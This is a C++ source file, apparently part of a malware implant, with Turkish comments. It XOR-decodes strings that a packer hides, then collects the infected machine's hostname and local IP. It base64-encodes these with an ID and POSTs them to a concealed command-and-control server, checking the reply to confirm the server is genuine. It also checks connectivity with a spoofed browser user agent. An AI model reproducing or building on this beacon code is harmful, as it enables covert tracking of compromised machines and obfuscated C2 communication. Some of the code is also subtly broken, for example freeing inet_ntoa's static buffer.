#include "WebFuncs.h"
#include "Shared.h"

#include <string> // for std::string
#include <wininet.h>

// HTTP istekleri icin
#pragma comment(lib, "wininet.lib")
// yerel IP'yi almak icin gerekli func lar icin
#pragma comment(lib, "Ws2_32.lib")

// these will be encoded by packer program
CHAR szHdrs[] = HEADERS;
CHAR szHttpRequest[] = WEBSITEPAGE;
CHAR gszSifre[] = STRKEY;

bool GetHTTPResponse(HINTERNET hResource, std::string* psData);

void XorEncode(PBYTE pbVeri, DWORD dwSize, PBYTE bSifre, DWORD dwSifreSize) {
	for (DWORD i = 0; i < dwSize; i++)
		if (pbVeri[i] != 0 && pbVeri[i] != bSifre[i % dwSifreSize])
			pbVeri[i] = pbVeri[i] ^ bSifre[i % dwSifreSize];
}

// decode ASCII string
void DecodeA(PCHAR szVeri) {
	XorEncode((PBYTE)szVeri, strlen(szVeri), (PBYTE)gszSifre, SIFRE_SIZE);
}

// decode UNICODE string
void DecodeW(PTCHAR szVeri) {
	XorEncode((PBYTE)szVeri, lstrlen(szVeri) * 2, (PBYTE)gszSifre, SIFRE_SIZE);
}

BOOL WebPing(LPSTR lpszUserName, LPSTR lpszWebAdres, LPSTR lpszID) {
	HINTERNET hOpenHandle = NULL, hResourceHandle = NULL, hConnectHandle = NULL;
	// CC den gelen cevap icin
	std::string sResponseData = "";
	// post datasi icin
	CHAR lpszFrmData[DEFAULT_SIZE] = "msg=";
	// PCTSTR rgpszAcceptTypes[] = { TEXT("text/*"), NULL };
	// CC ye gonderilecek mesaj icin
	char lpszMesaj[MSG_SIZE] = "";
	// local IP ve hostname bilgisi icin
	hostent* localHost;
	char* localIP = NULL;
	char localHostName[MSG_SIZE] = "";
	// sifreleme isleri icin:	
	char lpszEncodedMesaj[DEFAULT_SIZE];
	char* lpszURLEncodedMesaj = NULL;
	// WSSTARTUP için
	WSADATA wsaData;
	int iResult;
	// return var
	BOOL bSuccess = FALSE;

	// decoding strings
	DecodeA(szHttpRequest);
	DecodeA(lpszWebAdres);
	DecodeA(szHdrs);

	// Initialize Winsock, local IP yi alabilmek için
	iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
	if (iResult != 0) {
		PRINTF2("WSAStartup failed with error: %d\n", iResult);
		goto Cleanup;
	}

	// bilgisayarin ismini ve IP sini ogren
	gethostname(localHostName, sizeof(localHostName));
	localHost = gethostbyname(localHostName);
	localIP = inet_ntoa(*(struct in_addr *)*localHost->h_addr_list);

	// gönderilecek mesaji hazirla
	// mesaj formati: HOSTNAME_IP_ID
	StringCchCatA(lpszMesaj,MSG_SIZE, localHostName);
	StringCchCatA(lpszMesaj,MSG_SIZE, "_");
	StringCchCatA(lpszMesaj,MSG_SIZE, localIP);
	StringCchCatA(lpszMesaj,MSG_SIZE, "_");
	StringCchCatA(lpszMesaj,MSG_SIZE, lpszID);

	// ENCODED_MESAJ = URL_ENCODE(BASE64(mesaj))
	Base64encode(lpszEncodedMesaj, (const char*)lpszMesaj, strlen(lpszMesaj));
	lpszURLEncodedMesaj = url_encode(lpszEncodedMesaj);

	// gönderilecek HTTP POST istegini hazirla: msg=ENCODED_MESAJ
	StringCchCatA(lpszFrmData, DEFAULT_SIZE, lpszURLEncodedMesaj);

	// Normally, hOpenHandle, hResourceHandle,
	// and hConnectHandle need to be properly assigned.
	hOpenHandle = InternetOpenA(lpszUserName, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hOpenHandle == NULL) {
		HATA("WebPing", "InternetOpen failed.");
		goto Cleanup;
	}

	hConnectHandle = InternetConnectA(hOpenHandle,
	                                  lpszWebAdres,
	                                  INTERNET_INVALID_PORT_NUMBER,
	                                  NULL,
	                                  NULL,
	                                  INTERNET_SERVICE_HTTP,
	                                  0, 0);
	if (hConnectHandle == NULL) {
		HATA("WebPing", "InternetConnect failed.");
		goto Cleanup;
	}

	hResourceHandle = HttpOpenRequestA(hConnectHandle, "POST",
	                                   szHttpRequest,
	                                   NULL, NULL, NULL,
	                                   INTERNET_FLAG_KEEP_CONNECTION,
	                                   0);
	if (hResourceHandle == NULL) {
		HATA("WebPing", "HttpOpenRequestA failed.");
		goto Cleanup;
	}

	BOOL bSendSuccess = HttpSendRequestA(hResourceHandle, szHdrs, strlen(szHdrs), lpszFrmData, strlen(lpszFrmData));
	if (!bSendSuccess) {
		HATA("WebPing", "HttpSendRequestA failed");
		goto Cleanup;
	}
	// cevabi al
	if (!GetHTTPResponse(hResourceHandle, &sResponseData)) {
		HATA("WebPing", "GetHTTPResponse failed");
		goto Cleanup;
	}
	// bakalim dogru CC ye mi baglandik, gelen verinin içinde gonderilen mesajin acik hali var mi?
	if (sResponseData.find(lpszMesaj) == std::string::npos) {
		PRINTF("WebPing response format is incorrect.\n"); // istenilen cevap gelmedi ise
		goto Cleanup;
	}

	bSuccess = TRUE;

Cleanup:
	free(lpszURLEncodedMesaj);
	free(localIP);
	WSACleanup();

	InternetCloseHandle(hResourceHandle);
	InternetCloseHandle(hConnectHandle);
	InternetCloseHandle(hOpenHandle);

	return bSuccess;
}

#define COMMON_WEBSITE	TEXT("www.google.com")
#define USER_AGENT		TEXT("Mozilla / 7.0 (compatible; MSIE 11.0; Windows NT 6.1; WOW64; Trident / 6.5)")
#define	EXPECTED_STRING	"<title>Google</title>"
// trys to check is computer connected to internet
// to do that: 
// 1- trys to connect a common web site
// 2- checks if the response contains a predefined string
BOOL InternetCheck() {
	HINTERNET hOpenHandle = NULL, hResourceHandle = NULL, hConnectHandle = NULL;
	LPCWSTR webSiteName = COMMON_WEBSITE;
	PTSTR userAgent = USER_AGENT;
	char myHttpRequest[DEFAULT_SIZE] = "";
	std::string sResponseData = "";

	BOOL bSuccess = FALSE;

	hOpenHandle = InternetOpen(userAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hOpenHandle == NULL) {
		HATA("InternetCheck", "InternetOpen failed.");
		goto Cleanup;
	}

	hConnectHandle = InternetConnect(hOpenHandle,
	                                 webSiteName,
	                                 INTERNET_INVALID_PORT_NUMBER,
	                                 NULL,
	                                 NULL,
	                                 INTERNET_SERVICE_HTTP,
	                                 0, 0);
	if (hConnectHandle == NULL) {
		HATA("InternetCheck", "InternetConnect failed.");
		goto Cleanup;
	}

	hResourceHandle = HttpOpenRequestA(hConnectHandle, "GET",
	                                   myHttpRequest,
	                                   NULL, NULL, NULL,
	                                   INTERNET_FLAG_KEEP_CONNECTION,
	                                   0);
	if (hResourceHandle == NULL) {
		HATA("InternetCheck", "HttpOpenRequestA failed.");
		goto Cleanup;
	}

	BOOL bSendSuccess = HttpSendRequest(hResourceHandle, NULL, 0, NULL, 0);
	if (!bSendSuccess) {
		HATA("InternetCheck", "HttpSendRequestA failed.");
		goto Cleanup;
	}

	if (!GetHTTPResponse(hResourceHandle, &sResponseData)) {
		PRINTF("GetHTTPResponse failed.\n");
		goto Cleanup;
	}
	// check if the response contains the expected string 
	if (sResponseData.find(EXPECTED_STRING) == std::string::npos) {
		// aranilan string bulunamadi
		goto Cleanup;
	}

	bSuccess = TRUE;

Cleanup:
	WSACleanup();
	// Close the HINTERNET handle.
	InternetCloseHandle(hResourceHandle);
	InternetCloseHandle(hConnectHandle);
	InternetCloseHandle(hOpenHandle);

	return bSuccess;
}

// reads from internet resource and stores the info in a string var
bool GetHTTPResponse(HINTERNET hResource, std::string* psData) {
	DWORD dwSize = 0, dwTotalSize = 0;
	CHAR sBuffer[BUF_SIZE] = "";
	*psData = "";

	do {
		// Keep coping in BUFSIZE bytes chunks, while file has any data left.
		if (!InternetReadFile(hResource, sBuffer, BUF_SIZE, &dwSize)) {
			HATA("GetHTTPResponse", "InternetReadFile failed.");
			return false;
		}
		if (!dwSize)
			break; // Condition of dwSize=0 indicate EOF. Stop.			

		psData->append(sBuffer, dwSize);
	} // do
	while (TRUE);

	return true;
}
